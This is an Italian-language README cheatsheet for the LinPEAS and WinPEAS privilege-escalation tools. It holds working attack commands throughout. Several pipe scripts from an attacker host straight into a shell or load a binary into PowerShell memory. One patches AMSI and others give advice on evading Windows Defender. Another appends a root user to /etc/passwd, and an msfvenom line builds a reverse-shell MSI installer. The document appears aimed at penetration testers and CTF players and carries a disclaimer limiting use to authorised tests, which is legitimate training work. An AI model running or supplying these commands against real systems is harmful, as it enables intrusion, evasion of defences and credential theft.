<!-- language-home-navigation -->
[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🦹 PEASS-ng (LinPEAS & WinPEAS) - Cheatsheet completo

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██████╗ ███████╗ █████╗ ███████╗███████╗      ███╗   ██╗ ██████╗ 
  ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝      ████╗  ██║██╔════╝ 
  ██████╔╝█████╗  ███████║███████╗███████╗█████╗██╔██╗ ██║██║  ███╗
  ██╔═══╝ ██╔══╝  ██╔══██║╚════██║╚════██║╚════╝██║╚██╗██║██║   ██║
  ██║     ███████╗██║  ██║███████║███████║      ██║ ╚████║╚██████╔╝
  ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝      ╚═╝  ╚═══╝ ╚═════╝ 
             LinPEAS & WinPEAS Privilege Escalation Suite
```
<palign="centro">
  <img src="https://img.shields.io/badge/PEASS--ng-PrivEsc-red?style=for-the-badge" alt="PEASS-ng">
  <img src="https://img.shields.io/badge/LinPEAS-Linux_PrivEsc-blue?style=for-the-badge" alt="LinPEAS">
  <img src="https://img.shields.io/badge/WinPEAS-Windows_PrivEsc-orange?style=for-the-badge" alt="WinPEAS">
  <img src="https://img.shields.io/badge/Automated-Enumeration-green?style=for-the-badge" alt="Automated">
</p>

<palign="centro">
  <b>🔍 Gli strumenti di escalation automatizzata dei privilegi più famosi al mondo per sistemi Linux e Windows</b>
</p>

---

## 📋 Sommario

- [Introduzione](#-introduzione)
- [Legenda colori e come leggere l'output](#-color-legend--how-to-read-output)
- [LinPEAS (Linux Privilege Escalation)](#-linpeas-linux-privilege-escalation)
  - [Download ed esecuzione in memoria](#download--esecuzione-in-memoria)
  - [Opzioni della riga di comando](#opzioni della riga di comando)
  - [Vettori principali controllati da LinPEAS](#vettori-core-controllati-da-linpeas)
  - [Stealth ed evasione AV](#stealth--av-evasion)
- [WinPEAS (escalation dei privilegi di Windows)](#-winpeas-windows-privilege-escalation)
  - [Metodi di esecuzione (.exe vs .bat)](#metodi-di-esecuzione-exe-vs-bat)
  - [Esecuzione di WinPEAS in memoria](#esecuzione-winpeas-in-memoria)
  - [Vettori principali controllati da WinPEAS](#vettori-core-controllati-da-winpeas)
  - [Evitare Windows Defender e AMSI](#evitare-windows-defender--amsi)
- [Interpretazione dei risultati ad alta priorità](#-interpretazione-dei-risultati ad alta priorità)
- [Tabella di riferimento rapido](#-tabella-di-riferimento-rapido)
- [Suggerimenti e best practice](#-tips--best-practice)
- [Disclaimer legale](#-legal-disclaimer)
- [Risorse](#-risorse)

---

## 🎯 Introduzione

**PEASS-ng** (Privilege Escalation Awesome Scripts SUITE - nuova generazione), creato da Carlos Polop, è la raccolta standard de facto di strumenti di controllo automatizzati utilizzati per scoprire i vettori di escalation dei privilegi su sistemi compromessi:

- **LinPEAS:** Uno script Bash tutto in uno che cerca configurazioni errate, credenziali, file scrivibili, binari SUID, exploit del kernel, processi cron e contenitori su sistemi Linux/Unix.
- **WinPEAS:** Disponibile come binario .NET compilato autonomo (`winPEASany.exe`, `winPEASx64.exe`) e script batch leggero (`winPEAS.bat`) per il controllo di workstation, membri di dominio e server Windows.

---

## 🎨 Legenda colori e come leggere l'output

La forza distintiva di PEASS è il suo sistema automatizzato di classificazione del colore:

| Colore | Significato | Significato |
|-------|--------------|---------|
| 🔴 **ROSSO/GIALLO** | 🚨 **CRITICO (99% PrivEsc)** | Vettore di escalation dei privilegi altamente affidabile. Deve controllare immediatamente! |
| 🔴 **ROSSO** | ⚠️ **Interessante** | Configurazione insolita, impostazione non predefinita o candidato credenziale. |
| 🟡 **GIALLO** | ℹ️ **Informativa** | Scoperta notevole che potrebbe far parte di una catena di exploit. |
| 🔵 **CIANO/BLU** | 👥 **Contesto** | Utenti, gruppi e informazioni di sistema standard. |

> **Regola d'oro:** Scorri direttamente fino alle evidenziazioni **ROSSO/GIALLO** prima! Se vedi testo con sfondo giallo e lettere rosse, è quasi garantito un vettore di exploit.

---

## 🐧 LinPEAS (Escalation dei privilegi Linux)

### Download ed esecuzione in memoria

Raramente è necessario scrivere `linpeas.sh` su disco. Eseguilo direttamente in memoria utilizzando le utilità UNIX standard:
```bash
# 1. From attacker Python web server directly into bash
curl -L http://10.10.14.5:8000/linpeas.sh | sh

# Alternative using wget
wget -q -O - http://10.10.14.5:8000/linpeas.sh | sh

# 2. Download from official GitHub directly (if target has outbound internet access)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 3. Save output to file and review with colors preserved
./linpeas.sh -a > /tmp/linpeas.txt
less -r /tmp/linpeas.txt
```
### Opzioni della riga di comando
```bash
# Run all checks (including slower exhaustive searches)
./linpeas.sh -a

# Fast mode (skips slow regex / deep file checks)
./linpeas.sh -q

# Password provided for automated 'sudo -l' testing
./linpeas.sh -p 'KnownPassword123'

# Network-only checks (active connections, ARP cache, listening ports)
./linpeas.sh -N

# System information only
./linpeas.sh -s
```
### Vettori principali controllati da LinPEAS

1. **Errori di configurazione di Sudo (`sudo -l`):**
   - Comandi eseguibili come root senza password (`NOPASSWD`).
   - Riutilizzo del token Sudo / CVE-2021-3156 (Barone Samedit).
2. **Binari SUID/SGID:**
   - Binari con permessi di root (`chmod +s`). Riferimenti incrociati con **GTFOBins**.
3. **Funzionalità Linux:**
   - File binari con capacità elevate come `cap_setuid+ep` (ad esempio, `python3`, `tar`, `perl`).
4. **Attività pianificate e timer:**
   - Crontab (`/etc/crontab`, `/var/spool/cron/*`) e script programmati scrivibili.
   - Temporizzatori di sistema (`systemctl list-timers`).
5. **Dirottamento del percorso e dell'ambiente:**
   - Directory scrivibili in `$PATH`, relative ricerche di comandi negli script.
6. **Sfruttamento del kernel:**
   - Versione del kernel verificata rispetto agli exploit noti (Dirty COW, Dirty Pipe, OverlayFS).
7. **Squashing root NFS:**
   - Directory condivise montate con `no_root_squash` in `/etc/exports`.
8. **Raccolta delle credenziali:**
   - Password in chiaro in `.bash_history`, file di configurazione (`wp-config.php`, `.env`), chiavi SSH (`id_rsa`) e dump della memoria.

---

## 🪟 WinPEAS (Escalation dei privilegi di Windows)

### Metodi di esecuzione (.exe vs .bat)

WinPEAS è fornito in più formati:
- **`winPEASx64.exe` / `winPEASany.exe`:** Scritto in C#/.NET. Il più completo; esegue controlli approfonditi del registro, delle API e delle credenziali.
- **`winPEAS.bat`:** Script batch semplice. Altamente compatibile con le versioni legacy di Windows, non richiede dipendenze .NET ed elude alcuni rilevamenti binari statici.
```cmd
:: Run winPEAS binary with full color output
winPEASx64.exe

:: Run stealthily and redirect to text file
winPEASx64.exe > C:\Windows\Temp\out.txt

:: Fast check without heavy registry and file searches
winPEASx64.exe quiet
```
### Esecuzione di WinPEAS in memoria

Per evitare di salvare file su disco su workstation controllate, caricare WinPEAS direttamente nella memoria di PowerShell:
```powershell
# In-memory execution using Net.WebClient
$pe = (New-Object System.Net.WebClient).DownloadData('http://10.10.14.5:8000/winPEASx64.exe')
[System.Reflection.Assembly]::Load($pe)
[winPEAS.Program]::Main("")
```
### Vettori principali controllati da WinPEAS

1. **Autorizzazioni di servizio e percorsi non quotati:**
   - **Percorsi di servizio senza virgolette:** Percorsi binari di servizio con spazi e senza virgolette (`C:\Program Files\App\service.exe` -> l'attaccante posiziona `C:\Program.exe`).
   - **Autorizzazioni di servizio deboli:** Utenti non amministratori con `SERVICE_ALL_ACCESS` o `SERVICE_CHANGE_CONFIG`.
2. **Dirottamento DLL:**
   - Servizi che tentano di caricare DLL inesistenti da directory scrivibili dall'utente.
3. **AlwaysInstallElevated:**
   - Chiavi di registro `AlwaysInstallElevated = 1` che consentono a qualsiasi utente di installare pacchetti MSI elevati con `msiexec`.
4. **Privilegi token (SeImpersonate / SeAssignPrimaryToken):**
   - Sfruttabile tramite exploit Potato (SweetPotato, GodPotato, PrintSpoofer) per elevare gli account di servizio (`IIS APPPOOL`, `LOCAL SERVICE`) a `NT AUTHORITY\SYSTEM`.
5. **Archivi di credenziali e accesso automatico:**
   - Password in chiaro nel Registro di sistema (`DefaultPassword` in Winlogon).
   - Connessioni RDP salvate, credenziali Vault, BLOB DPAPI, sessioni PuTTY, password WiFi.
6. **File di backup SAM e SISTEMA:**
   - Copie scrivibili o leggibili di `C:\Windows\Repair\SAM` o `C:\Windows\System32\config\RegBack\SAM`.

### Bypassare Windows Defender e AMSI

Windows Defender contrassegna attivamente le versioni compilate di `winPEASx64.exe`. Per eseguire WinPEAS in ambienti monitorati:
```powershell
# 1. Obfuscate winPEAS binary using Invisibility / Donut or custom compiler
# 2. Patch AMSI in PowerShell session before running in memory:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 3. Alternatively, fall back to winPEAS.bat (often unflagged by AV):
curl.exe http://10.10.14.5:8000/winPEAS.bat -o %TEMP%\wp.bat && %TEMP%\wp.bat
```
---

## 🎯 Interpretazione dei risultati ad alta priorità

### 1. LinPEAS: scrivibile `/etc/passwd`
Se LinPEAS contrassegna `/etc/passwd` in **ROSSO/GIALLO**:
```bash
# Generate password hash:
openssl passwd -1 -salt evil SaltPass123
# Append root user:
echo 'root2:$1$evil$TNy7V...:0:0:root:/root:/bin/bash' >> /etc/passwd
su root2
```
### 2. WinPEAS: `SeImpersonatePrivilege` Presente
Se possiedi `SeImpersonatePrivilege`:
```powershell
# Elevate instantly using GodPotato or PrintSpoofer:
.\GodPotato-NET4.exe -cmd "cmd.exe /c whoami"
```
### 3. WinPEAS: `AlwaysInstallElevated` Impostato su 1
```powershell
# Generate malicious MSI payload:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o priv.msi
# Run installer as low-privileged user:
msiexec /quiet /qn /i priv.msi
```
---

## 📊 Tabella di consultazione rapida

| Obiettivo | Comando | Scopo |
|--------|---------|---------|
| **Linux (remoto)** | `curl -L http://<IP>/linpeas.sh \| sh` | Esecuzione in memoria senza toccare il disco |
| **Linux (locale)** | `./linpeas.sh -a > out.txt` | Audit completo salvato nel file di testo |
| **Linux (veloce)** | `./linpeas.sh -q` | Scansione veloce saltando le ricerche di file lente |
| **Windows (CLI)** | `winPEASx64.exe quiet` | Esecuzione veloce con rumore ridotto |
| **Windows (memoria)**| `[System.Reflection.Assembly]::Load($pe)` | Carica il binario .NET in memoria tramite PowerShell |
| **Windows (batch)** | `winPEAS.bat` | Esecuzione senza dipendenze per evasione legacy/AV |

---

## 💡 Suggerimenti e migliori pratiche

1. **Rivedi l'output utilizzando `less -r`:**
   Quando si reindirizza l'output a un file (`./linpeas.sh > linpeas.txt`), visualizzarlo sempre utilizzando `less -r linpeas.txt` o `cat linpeas.txt` in modo che i codici di escape colore ANSI terminali vengano visualizzati correttamente.
2. **Trasferimento tramite porta 80/443:**
   Quando esegui lo staging di LinPEAS o WinPEAS sul dispositivo dell'aggressore, ospita il tuo server web sulla porta `80` o `443` utilizzando `python3 -m http.server 80` per aggirare le rigide regole di uscita del firewall di destinazione.
3. **Non trascurare le credenziali nascoste:**
   Controlla le sezioni "File interessanti" e "Credenziali cloud" dell'output di LinPEAS; spesso i token API in testo semplice o le credenziali AWS garantiscono privilegi più elevati rispetto a un exploit locale.

---

## ⚠️ Disclaimer legale

> **IMPORTANTE:** Gli script PEASS-ng eseguono un controllo interno completo e il rilevamento della configurazione. Devono essere eseguiti solo su sistemi per i quali si dispone di un'autorizzazione documentata durante test di penetrazione autorizzati, esercizi CTF o audit di sicurezza interni.

---

## 📚 Risorse

- [Repository ufficiale GitHub di PEASS-ng](https://github.com/carlospolop/PEASS-ng)
- [Bibbia dell'escalation di privilegi e cloud di HackTricks](https://book.hacktricks.xyz/)
- [GTFOBins - Sfruttamento dei file binari Unix](https://gtfobins.github.io/)
- [LOLBAS - Windows che vive della terra](https://lolbas-project.github.io/)